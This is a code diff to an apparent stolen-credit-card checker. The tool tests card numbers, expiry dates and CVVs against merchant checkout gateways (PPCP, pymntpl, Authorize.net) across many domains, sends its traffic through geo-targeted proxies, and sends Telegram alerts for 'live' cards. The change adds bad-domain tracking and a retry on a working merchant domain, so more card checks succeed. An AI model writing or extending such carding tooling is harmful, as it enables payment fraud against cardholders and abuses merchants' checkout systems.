@@ -158,49 +158,73 @@ def _scan_worker(
         semaphore = threading.Semaphore(num_threads)
         idid      = session_id()
 
-        # ── Strict round-robin domain rotator (thread-safe) ───────────────────
-        _rr_index = 0
-        _rr_lock  = threading.Lock()
+        # ── Round-robin domain rotator + bad-domain tracking ─────────────────
+        _rr_index    = 0
+        _rr_lock     = threading.Lock()
+        _bad_domains: set = set()
 
-        def _next_domain() -> str:
+        def _next_good_domain() -> str:
             nonlocal _rr_index
             with _rr_lock:
-                domain = domains[_rr_index % len(domains)]
+                good = [d for d in domains if d not in _bad_domains]
+                pool = good if good else domains
+                d = pool[_rr_index % len(pool)]
                 _rr_index += 1
-            return domain
+            return d
 
         def check_one(card_tuple: tuple, domain: str) -> None:
             # Bail immediately if the job was stopped before this thread ran
             if job.get("stop"):
                 semaphore.release()
                 return
-            # Use user-supplied proxy if provided, otherwise use Rayobyte geo-targeted to domain country
-            if user_proxy:
-                sess = build_session_from_str(user_proxy)
-            else:
-                sess = build_session_for_domain(domain)
-            try:
-                if gateway == "ppcp":
-                    result = check_ppcp(sess, domain, card_tuple)
-                elif gateway == "pymntpl":
-                    result = check_pymntpl(sess, domain, card_tuple)
-                else:
-                    result = check_authnet(
-                        sess, domain, "",   # "" → auto-discover product_id
-                        card_tuple, idid=idid,
-                    )
-            except Exception as e:
-                cc, mm, yy, cvv = card_tuple
-                result = {
-                    "status":  "unknown",
-                    "message": str(e)[:120],
-                    "amount":  "",
-                    "card":    f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else ""),
-                }
-            finally:
-                sess.close()
 
-            result["domain"] = domain
+            new_bad_domain = ""
+            result = None
+            for attempt in range(2):
+                if job.get("stop"):
+                    break
+                if user_proxy:
+                    sess = build_session_from_str(user_proxy)
+                else:
+                    sess = build_session_for_domain(domain)
+                try:
+                    if gateway == "ppcp":
+                        result = check_ppcp(sess, domain, card_tuple)
+                    elif gateway == "pymntpl":
+                        result = check_pymntpl(sess, domain, card_tuple)
+                    else:
+                        result = check_authnet(
+                            sess, domain, "",   # "" → auto-discover product_id
+                            card_tuple, idid=idid,
+                        )
+                except Exception as e:
+                    cc, mm, yy, cvv = card_tuple
+                    result = {
+                        "status":  "unknown",
+                        "message": str(e)[:120],
+                        "amount":  "",
+                        "card":    f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else ""),
+                    }
+                finally:
+                    sess.close()
+
+                result["domain"] = domain
+
+                # First-attempt error → mark domain bad, retry on a good domain
+                if result["status"] == "unknown" and attempt == 0:
+                    with _rr_lock:
+                        _bad_domains.add(domain)
+                    new_bad_domain = domain
+                    job["bad_count"] = len(_bad_domains)
+                    good = [d for d in domains if d not in _bad_domains]
+                    if good:
+                        domain = good[0]
+                        continue  # retry on good domain
+                break  # success / already retried / no good domains left
+
+            if result is None:
+                semaphore.release()
+                return
 
             # Fetch BIN info for live hits only
             bin_info = ""
@@ -228,18 +252,20 @@ def _scan_worker(
                     job["unknown"] += 1
 
             job["queue"].put(json.dumps({
-                "type":     "result",
-                "card":     result["card"],
-                "status":   result["status"],
-                "message":  result["message"],
-                "amount":   result.get("amount", ""),
-                "domain":   result["domain"],
-                "bin_info": result.get("bin_info", ""),
-                "done":     job["done"],
-                "total":    job["total"],
-                "live":     job["live"],
-                "dead":     job["dead"],
-                "unknown":  job["unknown"],
+                "type":           "result",
+                "card":           result["card"],
+                "status":         result["status"],
+                "message":        result["message"],
+                "amount":         result.get("amount", ""),
+                "domain":         result["domain"],
+                "bin_info":       result.get("bin_info", ""),
+                "new_bad_domain": new_bad_domain,
+                "bad_count":      job.get("bad_count", 0),
+                "done":           job["done"],
+                "total":          job["total"],
+                "live":           job["live"],
+                "dead":           job["dead"],
+                "unknown":        job["unknown"],
             }))
 
             # Telegram notification for live hits
@@ -275,7 +301,7 @@ def _scan_worker(
         for card_tuple in cards:
             if job.get("stop"):
                 break
-            domain = _next_domain()
+            domain = _next_good_domain()
             semaphore.acquire()
             if job.get("stop"):
                 semaphore.release()
@@ -386,6 +412,7 @@ def scan():
         "live":       0,
         "dead":       0,
         "unknown":    0,
+        "bad_count":  0,
         "queue":      q_mod.Queue(),
         "created_at": time.time(),
     }
